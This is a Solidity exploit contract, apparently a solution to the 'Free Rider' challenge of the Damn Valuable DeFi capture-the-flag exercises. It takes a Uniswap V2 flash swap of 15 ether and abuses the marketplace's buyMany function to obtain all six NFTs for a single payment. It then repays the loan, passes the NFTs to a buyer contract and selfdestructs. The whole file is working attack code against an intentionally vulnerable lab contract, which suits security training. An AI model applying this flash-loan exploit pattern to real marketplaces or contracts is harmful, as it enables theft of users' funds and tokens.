// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../DamnValuableNFT.sol";
import "./FreeRiderNFTMarketplace.sol";
import "../WETH9.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "./FreeRiderBuyer.sol";

interface IUniswapV2Pair {
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function token0() external view returns (address);
}

interface IWETH9 {
    function deposit() external payable;
    function withdraw(uint256 wad) external;
    function transfer(address dst, uint wad) external returns (bool);
}
interface IUniswapV2Callee {
    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external;
}



contract FreeAttack is IUniswapV2Callee {

    FreeRiderNFTMarketplace private market;
    IUniswapV2Pair private uniswapPair;
    FreeRiderBuyer private buyerContract;
    
    IWETH9 private weth;
    ERC721 public nft;

    uint256 nftPrice = 15 ether;
    uint256[] private tokenIds = [0, 1, 2, 3, 4, 5];

    constructor (
        address payable _market,
        address _uniswapPair,
        address _weth,
        address _nft,
        address payable _buyer
    ){
        market = FreeRiderNFTMarketplace(_market);
        uniswapPair = IUniswapV2Pair(_uniswapPair);
        weth = IWETH9(_weth);
        nft = ERC721(_nft);
        buyerContract = FreeRiderBuyer(_buyer);
    }

    // Take a flash swap
    function attack() external {
        // Take a flash loan using swap
        uniswapPair.swap(15 ether, 0, address(this), new bytes(1));   
    }

    function uniswapV2Call(
        address, 
        uint256 amount0,
        uint256, 
        bytes calldata
    ) external override {
        // unwrap the weth we received (amount0)
        weth.withdraw(amount0);

        // now we have 15 ether so we can buy the NFTs
        market.buyMany{value: 15 ether}(tokenIds);

        uint256 amountToRepay = amount0 + ((amount0 * 3)/997) + 1;

        // get weth back 
        weth.deposit{ value: amountToRepay}(); 

        // pay back the loan
        weth.transfer(address(uniswapPair), amountToRepay);

        // transfer NFTs to buyerContract
        for (uint256 i; i < 6; i++) {
            nft.safeTransferFrom(address(this), address(buyerContract), i);
        }

        selfdestruct(payable(tx.origin));
    }

    function onERC721Received(
        address,
        address,
        uint256 _tokenId,
        bytes memory
    )
    external
    pure
    returns (bytes4)
    {
        return IERC721Receiver.onERC721Received.selector;
    }


    receive() external payable {}
}